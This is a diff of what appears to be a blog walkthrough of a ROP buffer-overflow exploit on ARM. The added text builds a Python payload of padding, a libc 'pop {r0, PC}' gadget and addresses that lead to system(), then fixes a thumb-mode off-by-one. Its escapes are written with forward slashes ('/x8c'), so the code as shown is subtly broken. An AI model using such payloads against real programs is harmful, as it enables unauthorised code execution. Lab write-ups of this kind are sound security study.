@@ -223,8 +223,38 @@ Now, our payload looks like:
     libc = 0xb6ede000 #Base address of libc
     
     payload = 'A' * 132
-    payload += pack('<I', libc + 0x0000726d) #The gadget LDR r0, [SP, #4]
-    payload += "/x8c/xb4/xf0/xb6/x7c/x40/xfb/xb6"
+    payload += pack('<I', libc + 0x0000726d) #The gadget pop {r0, PC}
+    payload += "/x7c/x40/xfb/xb6/x8c/xb4/xf0/xb6"
+    print payload
+
+Lets try it out (Please work)
+
+![]({{site.baseurl}}/_posts/failure.png)
+_Segmentation Fault... again._
+
+
+Another failure? Yet the objective seems in reach --- the next instruction should've been to carry out the system() command already. What happened?
+
+
+As it turned out, I did not realise what I needed to do to fix this until I actually cracked it with another gadget. For the sake of not prolonging this much further, I'll cover the small mistake I made.
+
+
+## **Finally?**
+
+
+All I had to do was to look at $PC.
+![theerror.png]({{site.baseurl}}/_posts/theerror.png)
+
+
+The address that PC was pointing at and the actual next address for system were **not the same**. This is because the program entered thumb mode and everything was displaced by 1. As such, PC was not pointing to a complete instruction and crashed. All I needed to do was to change that /x8c to /x8d.
+
+	#!/usr/bin/python
+    from struct import pack
+    libc = 0xb6ede000 #Base address of libc
+    
+    payload = 'A' * 132
+    payload += pack('<I', libc + 0x0000726d) #The gadget pop {r0, PC}
+    payload += "/x7c/x40/xfb/xb6/x8d/xb4/xf0/xb6" #just the slightest of differences...
     print payload
 
 
